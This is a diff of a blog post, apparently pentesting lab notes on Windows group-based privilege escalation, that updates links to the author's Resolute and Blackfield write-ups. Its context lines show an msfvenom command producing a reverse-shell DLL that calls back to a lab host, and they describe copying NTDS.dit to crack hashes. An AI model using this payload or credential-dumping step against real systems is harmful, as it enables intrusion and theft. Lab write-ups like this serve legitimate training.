@@ -266,7 +266,7 @@ We create our malicious plugin using msfvenom
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f dll -o whare.dll
 ````
 
-Next steps explianed <a href="https://whare1.github.io/posts/Resolute-Writeup/" target="_blank">on resolute writeup</a>
+Next steps explianed <a href="https://whare1.github.io/posts/Resolute-Writeup/#abusing-dnsadmins-group" target="_blank">on resolute writeup</a>
 
 #### LAPS_Readers
 ---
@@ -285,9 +285,6 @@ The Backup Operators group is a built-in group in Windows that grants its member
 
 Our goal is to leverage our membership in the Backup Operators group to try to copy the NTDS.dit file. Once we have a copy of the file, we can extract and crack the hashes stored inside it to potentially gain access to other user accounts or escalate our privileges further.
 
-Guide step by step <a href="https://whare1.github.io/posts/Blackfield-Writeup" target="_blank">here</a>
-
-
-
+Guide step by step <a href="https://whare1.github.io/posts/Blackfield-Writeup/#privilege-escalation" target="_blank">here</a>
 
 ![netrunner](/assets/images/netrunner.gif)
